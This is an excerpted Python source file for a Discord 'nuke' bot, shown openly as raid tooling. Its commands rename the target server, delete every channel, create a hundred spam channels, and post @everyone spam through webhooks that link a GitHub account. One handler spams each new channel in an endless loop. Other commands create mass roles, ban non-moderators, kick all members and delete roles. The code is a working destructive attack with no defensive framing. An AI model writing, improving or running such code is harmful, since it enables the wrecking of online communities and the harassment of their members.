...
@bot.event
async def on_ready():
    print(f"{bot.user} is startet now u ")
...
async def nuke(ctx):
    ...
    await ctx.guild.edit(name="Snowdeeserttt Was Here")

    await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])

    await asyncio.gather(*[ctx.guild.create_text_channel("Snow Was Here") for _ in range(100)])

    for channel in ctx.guild.text_channels:
        num_webhooks = 1 # change this to the # of webhooks you want
        for _ in range(num_webhooks):
            webhook = await channel.create_webhook(name=f"Snowdesert{_}")
            for _ in range(5):
                await webhook.send(f"@everyone **Palle Was Here!** https://github.com/Snowdeserr")
                await ctx.send("Nuking yoour Discord Server oh no!!!")
...
async def on_guild_channel_create(channel):
    while True:
        await channel.send("@everyone  The Snowdesert was here https://github.com/Snowdeserr follow now **!**")
...
async def rolespam(ctx):
    ...
    await ctx.message.delete()
    for i in range(100):
        await ctx.guild.create_role(name="wizzed by snowdesert")
    """
    Spam roles in the server.
    """
    ...
    try:
        for member in ctx.guild.members:
            if ctx.author.guild_permissions.ban_members and not member.guild_permissions.ban_members:
                await member.ban(reason="Snowdesert Was Here")
...
async def kickall(ctx):
    ...
    try:
        for member in ctx.guild.members:
            await member.kick(reason="Snowdesert is nuking your server")
...
async def delroles(ctx):
    ...
    try:
        await asyncio.gather(*[role.delete(reason="Roles deleted by Snowdesert") for role in roles_to_delete])
